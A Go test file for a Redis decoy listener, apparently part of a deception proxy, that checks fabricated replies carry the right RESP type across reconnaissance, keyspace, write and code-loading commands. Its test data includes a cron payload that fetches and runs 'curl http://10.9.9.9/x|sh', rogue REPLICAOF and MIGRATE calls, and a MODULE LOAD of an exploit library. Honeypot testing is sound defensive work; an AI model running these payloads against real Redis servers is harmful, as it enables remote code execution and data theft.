package redis

import (
	"strings"
	"testing"

	"github.com/rom/xproxy/internal/config"
	wire "github.com/rom/xproxy/internal/respwire"
)

// Every command family the fabrication answers, and the shape of each answer.
//
// Shape is what matters here rather than content. A client library switches on
// the type marker and a scanner fingerprints on it, so a reply of the wrong
// shape is how a decoy is found -- and being found is the only way this
// listener fails. The families below are the ones an exploitation attempt
// against an exposed Redis actually walks: reconnaissance, then the keyspace,
// then a write, then the command that was the point of the write.

// A table of one command and the first octet its answer has to carry, which is
// RESP's type marker: + simple string, - error, : integer, $ bulk string,
// * array.
func TestEveryCommandFamilyAnswersInTheRightShape(t *testing.T) {
	d := decoyFor(t, &config.RedisDeception{Mode: "decoy", Profile: "session-store"})
	keys := d.matching("*", 64)
	if len(keys) == 0 {
		t.Fatal("the fabricated keyspace is empty")
	}
	held := keys[0]

	for _, tc := range []struct {
		parts []string
		want  byte
		// has, where the body is the point rather than the shape.
		has string
	}{
		// Reconnaissance.
		{parts: []string{"PING"}, want: wire.TypeSimpleString},
		{parts: []string{"PING", "hello"}, want: wire.TypeBulkString},
		{parts: []string{"ECHO", "hello"}, want: wire.TypeBulkString},
		{parts: []string{"ECHO"}, want: wire.TypeError, has: "wrong number of arguments"},
		{parts: []string{"TIME"}, want: wire.TypeArray},
		{parts: []string{"LASTSAVE"}, want: wire.TypeInteger},
		{parts: []string{"DBSIZE"}, want: wire.TypeInteger},
		{parts: []string{"CLUSTER", "INFO"}, want: wire.TypeBulkString, has: "cluster_enabled:0"},
		{parts: []string{"ACL", "WHOAMI"}, want: wire.TypeBulkString, has: "default"},
		{parts: []string{"ACL", "LIST"}, want: wire.TypeArray, has: "user default on nopass"},
		{parts: []string{"SLOWLOG", "LEN"}, want: wire.TypeInteger},
		{parts: []string{"SLOWLOG", "GET"}, want: wire.TypeArray},
		{parts: []string{"MEMORY", "USAGE", held}, want: wire.TypeInteger},
		{parts: []string{"MEMORY", "DOCTOR"}, want: wire.TypeBulkString, has: "fragmentation"},
		{parts: []string{"CLIENT", "ID"}, want: wire.TypeInteger},
		{parts: []string{"CLIENT", "GETNAME"}, want: wire.TypeBulkString},
		{parts: []string{"CLIENT", "SETNAME", "nmap"}, want: wire.TypeSimpleString},
		{parts: []string{"CLIENT", "LIST"}, want: wire.TypeBulkString, has: "cmd=client|list"},
		{parts: []string{"CLIENT", "KILL", "x"}, want: wire.TypeError, has: "Unknown CLIENT subcommand"},

		// The keyspace.
		{parts: []string{"TYPE", held}, want: wire.TypeSimpleString},
		{parts: []string{"TYPE", "nothing-here"}, want: wire.TypeSimpleString, has: "none"},
		{parts: []string{"TYPE"}, want: wire.TypeError, has: "wrong number of arguments"},
		{parts: []string{"EXISTS", held, "nothing-here"}, want: wire.TypeInteger, has: ":1"},
		{parts: []string{"TTL", held}, want: wire.TypeInteger, has: ":-1"},
		{parts: []string{"TTL", "nothing-here"}, want: wire.TypeInteger, has: ":-2"},
		{parts: []string{"PTTL"}, want: wire.TypeError, has: "wrong number of arguments"},
		{parts: []string{"GET"}, want: wire.TypeError, has: "wrong number of arguments"},
		{parts: []string{"KEYS"}, want: wire.TypeError, has: "wrong number of arguments"},
		{parts: []string{"LRANGE", "nothing-here", "0", "-1"}, want: wire.TypeArray},
		{parts: []string{"SMEMBERS", held}, want: wire.TypeArray},
		{parts: []string{"LPOP", "nothing-here"}, want: wire.TypeBulkString, has: "$-1"},
		{parts: []string{"SPOP", held}, want: wire.TypeBulkString},
		{parts: []string{"LLEN", held}, want: wire.TypeInteger},
		{parts: []string{"INCR", "counter"}, want: wire.TypeInteger},
		{parts: []string{"DECRBY", "counter", "2"}, want: wire.TypeInteger},

		// Writes, which are where a payload arrives and are accepted and not
		// kept: the reply is what keeps the visitor going on to the command
		// that says what they meant to do with it.
		{parts: []string{"SET", "x", "* * * * * root curl http://10.9.9.9/x|sh"}, want: wire.TypeSimpleString},
		{parts: []string{"EXPIRE", "x", "60"}, want: wire.TypeInteger, has: ":1"},
		{parts: []string{"PERSIST", "x"}, want: wire.TypeInteger, has: ":1"},
		{parts: []string{"SETNX", "x", "1"}, want: wire.TypeInteger},
		{parts: []string{"DEL", "x"}, want: wire.TypeInteger},
		{parts: []string{"APPEND", "x", "more"}, want: wire.TypeInteger},
		{parts: []string{"RPUSH", "list", "1"}, want: wire.TypeInteger},
		{parts: []string{"ZADD", "set", "1", "a"}, want: wire.TypeInteger},
		{parts: []string{"SAVE"}, want: wire.TypeSimpleString},
		{parts: []string{"BGSAVE"}, want: wire.TypeSimpleString, has: "Background saving started"},
		{parts: []string{"BGREWRITEAOF"}, want: wire.TypeSimpleString, has: "append only file"},
		{parts: []string{"FLUSHALL"}, want: wire.TypeSimpleString},
		{parts: []string{"REPLICAOF", "10.9.9.9", "6379"}, want: wire.TypeSimpleString},
		{parts: []string{"MIGRATE", "10.9.9.9", "6379", held, "0", "100"}, want: wire.TypeSimpleString, has: "NOKEY"},

		// The things this fabrication refuses to pretend about, because a
		// reply implying code was running would have to keep implying it and
		// nothing afterwards would be consistent.
		{parts: []string{"EVAL", "return 1", "0"}, want: wire.TypeError, has: "NOSCRIPT"},
		{parts: []string{"FCALL", "f", "0"}, want: wire.TypeError, has: "NOSCRIPT"},
		{parts: []string{"MODULE", "LOAD", "/tmp/exp.so"}, want: wire.TypeError, has: "Error loading the extension"},
		{parts: []string{"MODULE", "LIST"}, want: wire.TypeArray},
		{parts: []string{"FUNCTION", "LIST"}, want: wire.TypeArray},
		{parts: []string{"FUNCTION", "DUMP"}, want: wire.TypeError, has: "Function not found"},
		{parts: []string{"SCRIPT", "LOAD", "return 1"}, want: wire.TypeBulkString},
		{parts: []string{"SCRIPT", "FLUSH"}, want: wire.TypeSimpleString},
		{parts: []string{"DEBUG", "SEGFAULT"}, want: wire.TypeError, has: "DEBUG command not allowed"},

		// And the ones that would otherwise leave the connection waiting. A
		// fabrication has nothing to publish and nothing to block on, so it
		// says so rather than holding a socket open for ever.
		{parts: []string{"SUBSCRIBE", "ch"}, want: wire.TypeError, has: "unsupported on this instance"},
		{parts: []string{"BLPOP", "list", "0"}, want: wire.TypeError, has: "unsupported on this instance"},
		{parts: []string{"MONITOR"}, want: wire.TypeError, has: "unsupported on this instance"},
	} {
		name := strings.Join(tc.parts, " ")
		got := answerOf(t, d, cmd(t, tc.parts...))
		if len(got) == 0 {
			t.Errorf("%s: answered nothing", name)
			continue
		}
		if got[0] != tc.want {
			t.Errorf("%s: answered %q, which is a %c and not a %c", name, got, got[0], tc.want)
		}
		if tc.has != "" && !strings.Contains(got, tc.has) {
			t.Errorf("%s: %q does not carry %q", name, got, tc.has)
		}
		// Whatever it is, it is one reply: a fabrication that wrote two would
		// put the connection out of step with the client's own reader, which
		// is a tell no amount of plausible content covers.
		if strings.Count(got, "\r\n") == 0 {
			t.Errorf("%s: %q is not terminated", name, got)
		}
	}

	// SHUTDOWN is the one command with no reply, because the real server
	// closes the connection. A reply here would be a server that had not shut
	// down.
	if b, ok := d.answer(cmd(t, "SHUTDOWN"), true); !ok || len(b) != 0 {
		t.Errorf("SHUTDOWN answered %q", b)
	}

	// And a listener with no deception section reports no decoy, so the status
	// view names the listeners that are fabricating and no others.
	if st, ok := (&server{}).DecoyStatus(); ok {
		t.Errorf("a listener with no fabrication reported a status: %+v", st)
	}
}

// The profiles are a list an operator picks from, so the list has to be the
// one the code implements: a name that is not there is a listener that will
// not start, and a profile missing from the list is one nobody will find.
func TestTheProfilesAreTheOnesAnOperatorCanName(t *testing.T) {
	got := Profiles()
	if len(got) < 2 {
		t.Fatalf("profiles: %v", got)
	}
	for i := 1; i < len(got); i++ {
		if got[i-1] >= got[i] {
			t.Errorf("the list is not sorted: %v", got)
			break
		}
	}
	for _, name := range got {
		if _, err := newDecoy(&config.RedisDeception{Mode: "decoy", Profile: name}, "cache"); err != nil {
			t.Errorf("the listed profile %q does not load: %v", name, err)
		}
	}
	if _, err := newDecoy(&config.RedisDeception{Mode: "decoy", Profile: "not-a-profile"}, "cache"); err == nil {
		t.Error("a profile nothing implements was accepted")
	}
}
